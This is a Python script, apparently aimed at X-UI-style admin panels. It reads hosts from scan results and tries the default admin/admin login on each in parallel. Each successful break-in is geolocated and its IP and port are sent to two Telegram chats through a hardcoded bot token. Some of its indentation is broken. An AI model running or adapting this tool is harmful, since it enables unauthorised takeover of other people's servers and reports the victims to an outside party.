import re
import requests
from concurrent.futures import ThreadPoolExecutor

data = {
    'username': 'admin',
    'password': 'admin'
}

def get_ip_info(ip):
    url = f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp"
    try:
        response = requests.get(url, timeout=2)
        if response.status_code == 200:
            ip_info = response.json()
            country = ip_info.get('country', 'N/A')
            region = ip_info.get('regionName', 'N/A')
            city = ip_info.get('city', 'N/A')
            isp = ip_info.get('isp', 'N/A')
            return f"{country}, {region}, {city}, ISP: {isp}"
    except requests.exceptions.RequestException:
        pass
    return 'N/A'

def send_message(ip_port, ip_info):
    TOKEN = '6904748810:AAGK5Mf3RtnmXLFKv6yLKoL03BVx5LJNhnY'
    chat_id_1 = '5457029194'
    chat_id_2 = '6021321590'
        message_text = f"{ip_port} ({ip_info})"
        URL = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        params_1 = {
        'chat_id': chat_id_1,
        'text': message_text
    }
    requests.post(URL, data=params_1)
        params_2 = {
        'chat_id': chat_id_2,
        'text': message_text
    }
    requests.post(URL, data=params_2)

def try_login(ip, protocol, port):
    url = f"{protocol}://{ip}:{port}/login"
    for _ in range(3):
        try:
            response = requests.post(url, data=data, timeout=2, verify=(protocol == "https"))
            if response.status_code == 200:
                try:
                    response_data = response.json()
                    if isinstance(response_data, dict) and response_data.get("success"):
                        ip_info = get_ip_info(ip)
                        result = f"{ip}:{port} Successful ({ip_info})"
                        with open("succeed.txt", "a") as xui_file:
                            xui_file.write(result + '\n')
                        send_message(f"{ip}:{port}", ip_info)  # 登录成功后发送消息
                        return result
                except ValueError:
                    return f"Invalid JSON response from: {url}"
        except requests.exceptions.RequestException:
            pass
    return f"{ip}:{port} Def"

def process_ip(ip_line):
    match = re.match(r".*Host:\s+(\d+\.\d+\.\d+\.\d+).*Ports:\s+(\d+)/", ip_line)
    if match:
        ip = match.group(1)
        port = match.group(2)
        result = try_login(ip, "http", port) or try_login(ip, "https", port)
        if result:
            print(result)

if __name__ == "__main__":
    with open("results.txt", "r") as file:
        ip_lines = [line.strip() for line in file if "Host:" in line and "Ports:" in line]

    with ThreadPoolExecutor() as executor:
        executor.map(process_ip, ip_lines)